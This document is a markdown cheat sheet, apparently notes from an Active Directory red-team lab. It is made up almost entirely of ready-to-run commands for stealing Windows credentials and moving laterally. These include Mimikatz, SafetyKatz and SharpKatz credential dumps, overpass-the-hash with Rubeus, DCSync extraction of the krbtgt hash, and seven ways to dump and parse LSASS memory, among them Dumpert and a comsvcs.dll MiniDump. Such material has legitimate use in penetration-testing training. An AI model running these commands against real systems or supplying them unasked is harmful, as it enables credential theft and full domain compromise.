# Lateral Movement [ Invoke-Mimikatz, SafetyKatz, Rubeus.exe ]
## Dump credentials on a local machine
```powershell
Invoke-Mimikatz -DumpCreds
```

## Dump credentials on multiple remote machines
```powershell
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
```

## OverPass-The-Hash : generate tokens from hashes
```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntImhash> /run:powershell.exe"'

# Invoke-Mimikatz using AES
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'

# SafetyKatz
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"

# The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).

# Rubeus.exe
# Below doesn't need elevation
Rubeus.exe asktgt /user:administrator /rc4: /ptt

# Below command needs elevation
Rubeus.exe asktgt /user:administrator /aes256: /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## DCSync Attack
+ To extract credentials from the DC without code execution on it, we can use DCSync
+ To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain
+ By default, Domain Admins privileges are required to run DCSync
```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'

# SafetyKatz
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"

# SafetyKatz Old (For Windows 2020 Server)
SafetyKatz_old.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

---

# Other ways to extract creds from LSASS

## Invoke-Mimikatz
### 1. Dump credentials on a local machine using Mimikatz
```powershell
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

---

## SafetyKatz & SharpKatz
### 2. Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
```powershell
SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"

# SafetyKatz Old (For Windows 2020 Server)
SafetyKatz_old.exe -Command "sekurlsa::ekeys" "exit"
```

### 3. Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality)
```powershell
SharpKatz.exe -Command ekeys
```

---

## Dumpert
### 4. Dump credentials using Dumpert (Direct System Calls and API unhooking)
```powershell
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```

---

## pypykatz
### 5. Using pypykatz (Mimikatz functionality in Python)
```powershell
pypykatz.exe live lsa
```

---

## comsvcs.dll
### 6. Using comsvcs.dll
```powershell
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
```

> Now Extract the creds from lsass dump

```powershell
# Run mimikatz
# set the location of the lsass dump
sekurlsa::minidump C:\AD\Tools\lsass.DMP

# get the debug privs
privilege::debug

# now get the ekeys
sekurlsa::ekeys
```

---

## SharpKatz
### 7. Using SharpKatz.exe to do DCSync Attack
```powershell
SharpKatz.exe --Command dcsync --User us\krbtgt --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local
```
